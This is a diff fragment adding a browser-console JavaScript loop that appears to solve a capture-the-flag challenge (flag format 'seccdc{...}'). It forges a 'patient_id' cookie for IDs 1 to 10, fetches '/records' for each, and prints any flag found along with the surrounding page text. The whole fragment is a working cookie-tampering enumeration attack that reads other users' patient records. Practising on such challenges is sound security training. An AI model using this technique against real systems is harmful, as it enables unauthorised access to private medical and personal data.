@@ -10,3 +10,20 @@ for (let i = 1; i <= 10; i++) {
       }
     });
 }
+
+
+for (let i = 1; i <= 10; i++) {
+  fetch("/records", { headers: { "cookie": "patient_id=" + i } })
+    .then(res => res.text())
+    .then(text => {
+      // This checks if the flag format exists in the page text
+      const flagMatch = text.match(/seccdc\{.*?\}/);
+      if (flagMatch) {
+        console.log(`%c FOUND FLAG IN ID ${i}: ${flagMatch[0]}`, "color: black; background: #00ff00; font-weight: bold; padding: 5px;");
+        // Also print the text around it to confirm it's Boone
+        console.log("Context:", text.substring(text.indexOf(flagMatch[0]) - 50, text.indexOf(flagMatch[0]) + 100));
+      } else {
+        console.log(`ID ${i}: No flag found.`);
+      }
+    });
+}
